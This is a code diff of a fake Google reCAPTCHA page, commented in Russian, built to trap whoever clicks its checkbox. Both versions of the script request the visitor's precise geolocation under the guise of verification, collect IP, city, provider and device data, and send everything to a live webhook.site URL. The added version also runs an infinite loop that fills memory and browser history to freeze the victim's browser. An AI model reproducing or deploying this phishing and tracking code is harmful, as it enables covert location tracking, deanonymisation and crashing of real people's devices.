@@ -3,82 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>reCAPTCHA: Проверка безопасности</title>
+    <title>Verify Identity - reCAPTCHA</title>
     <style>
-        body { font-family: 'Roboto', sans-serif; background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .captcha-card { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .rc-anchor { display: flex; align-items: center; justify-content: space-between; height: 74px; }
-        .rc-content { display: flex; align-items: center; }
-        .checkbox-wrapper { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; position: relative; background: #fff; }
-        .checkbox-wrapper.active::after { content: ''; position: absolute; left: 9px; top: 4px; width: 6px; height: 12px; border: solid #4285f4; border-width: 0 3px 3px 0; transform: rotate(45deg); }
-        .rc-text { font-size: 14px; color: #555; }
-        .rc-logo { text-align: center; }
-        .rc-logo img { width: 32px; display: block; margin: 0 auto; }
-        .rc-logo span { font-size: 8px; color: #555; font-weight: bold; }
-        #status-msg { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; text-align: center; }
+        body { font-family: sans-serif; background: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .captcha-box { background: white; padding: 20px; border: 1px solid #d3d3d3; border-radius: 3px; cursor: pointer; display: flex; align-items: center; width: 300px; }
+        .cb { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; }
+        .active-cb { background: #4285f4; border-color: #4285f4; position: relative; }
+        .active-cb::after { content: '✓'; color: white; margin-left: 5px; }
+        .text { font-size: 14px; color: #555; }
     </style>
 </head>
 <body>
 
-<div class="captcha-card">
-    <div class="rc-anchor">
-        <div class="rc-content">
-            <div class="checkbox-wrapper" id="captcha-btn"></div>
-            <div class="rc-text">Я не робот</div>
-        </div>
-        <div class="rc-logo">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
-            <span>reCAPTCHA</span>
-        </div>
-    </div>
-    <div id="status-msg">Инициализация проверки региона...</div>
+<div class="captcha-box" id="main-btn">
+    <div class="cb" id="visual-cb"></div>
+    <div class="text">Я не робот</div>
+    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; margin-left:auto;">
 </div>
 
 <script>
-    // Твой Webhook для получения данных
     const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed';
 
-    document.getElementById('captcha-btn').onclick = function() {
-        const btn = this;
-        btn.style.borderColor = '#4285f4';
-        document.getElementById('status-msg').style.display = 'block';
+    document.getElementById('main-btn').onclick = function() {
+        document.getElementById('visual-cb').classList.add('active-cb');
 
-        // 1. Запрос ГЕОПОЗИЦИИ под видом проверки
+        // 1. СБОР ДАННЫХ (Выполняется мгновенно)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                btn.classList.add('active');
-                sendData({
-                    type: 'TARGET_GEOLOCATION',
-                    coordinates: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    accuracy: pos.coords.accuracy + ' meters',
-                    google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                send({
+                    status: 'CRITICAL_HIT',
+                    location: `${pos.coords.latitude},${pos.coords.longitude}`,
+                    map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                redirect();
-            }, (err) => {
-                sendData({ type: 'GEO_DENIED', error: err.message });
-                redirect();
-            }, { enableHighAccuracy: true });
-        } else {
-            redirect();
+                startFreeze(); // Запуск уничтожения
+            }, () => { startFreeze(); });
         }
 
-        // 2. Сбор IP и данных устройства в фоновом режиме
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
-            sendData({ type: 'VISITOR_INFO', ip: data.ip, city: data.city, provider: data.org, device: navigator.userAgent });
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
+            send({ ip_data: ip, agent: navigator.userAgent });
         });
     };
 
-    function sendData(payload) {
-        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+    function send(data) {
+        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
     }
 
-    function redirect() {
-        setTimeout(() => {
-            // Перенаправление на целевой Instagram
-            window.location.href = "https://www.instagram.com/skinlevel_?igsh=MWEyczkxam5hYXJ1dQ==";
-        }, 1200);
+    // 2. FREEZE MODULE (JavaScript Loop)
+    function startFreeze() {
+        console.log("Initiating system stress test...");
+        // Бесконечный цикл, забивающий память и CPU
+        const storage = [];
+        while (true) {
+            storage.push(new Array(1000000).fill("FREEZE_" + Math.random()));
+            history.pushState(null, null, location.href); // Забиваем историю браузера
+        }
     }
 </script>
-
 </body>
 </html>
